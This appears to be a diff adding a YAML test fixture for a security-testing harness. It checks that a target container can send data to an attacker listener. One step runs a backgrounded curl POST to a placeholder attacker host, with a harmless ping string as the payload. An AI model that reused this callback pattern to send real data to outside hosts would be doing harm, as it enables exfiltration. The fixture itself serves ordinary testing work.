@@ -1,0 +1,23 @@
+# Fixture: exec_and_listen
+# Tests: exec_target (god-view), listen action, received_contains assertion
+# The target container sends data to the attacker listener during the listen window.
+# exec_target is used here as god-view — valid in L1/test contexts.
+procedure:
+  # Schedule the target to send data after 1s (returns immediately due to &)
+  - step_id: schedule_send
+    action:
+      type: exec_target
+      command: "(sleep 1 && curl -sf -X POST http://${attacker_host}:9998 --max-time 2 -d 'PING_FROM_TARGET' || true) &"
+    expect:
+      exit_code: 0
+    timeout: 5
+
+  # Open listener, wait 5s — target should deliver the ping within that window
+  - step_id: capture_ping
+    action:
+      type: listen
+      port: 9998
+      duration: 5
+    expect:
+      received_contains: "PING_FROM_TARGET"
+    timeout: 15
